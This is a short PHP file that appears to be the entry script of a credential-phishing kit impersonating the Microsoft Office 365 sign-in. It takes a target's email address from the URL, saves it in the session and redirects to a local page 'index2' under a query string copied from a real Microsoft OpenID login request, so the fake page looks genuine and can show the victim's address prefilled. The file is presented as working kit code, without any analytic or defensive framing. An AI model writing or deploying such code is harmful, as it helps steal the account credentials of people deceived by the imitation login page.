<?php
if(!isset($_SESSION)) 
    { 
        session_start(); 
    }
	
	if (isset($_GET['email'])) {
    $_SESSION['UserAddress'] = strtolower($_GET['email']);
	$_SESSION['Index2'] = "Yes";
	header("Location: ./index2?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3donpDpYbVA9UXVeosIVrA2-DRa_7W9BcPErYg_pHkzLEm2C1CXJyT7zl-TTnGm7GUwNa28IqVdMPLDfTu22Vkx9jLw7ulhKTeOy8b3tB1XrriWmPomqxiCJyQbvHmEDVD&nonce=636905940261455591.NGY1NDc0NjYtYTUyNi00NzQ5LWE0NTEtMzY4ZTkxMjBlOTc1MGJlMDllZmQtODE0Ni00N2U2LWI2MjctZjYyYzcxODY2ZmM3&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6"); 
    exit();
	
} else {
	$_SESSION['Index2'] = "Yes";
	header("Location: ./index2?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3donpDpYbVA9UXVeosIVrA2-DRa_7W9BcPErYg_pHkzLEm2C1CXJyT7zl-TTnGm7GUwNa28IqVdMPLDfTu22Vkx9jLw7ulhKTeOy8b3tB1XrriWmPomqxiCJyQbvHmEDVD&nonce=636905940261455591.NGY1NDc0NjYtYTUyNi00NzQ5LWE0NTEtMzY4ZTkxMjBlOTc1MGJlMDllZmQtODE0Ni00N2U2LWI2MjctZjYyYzcxODY2ZmM3&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6"); 
    exit();
}

?>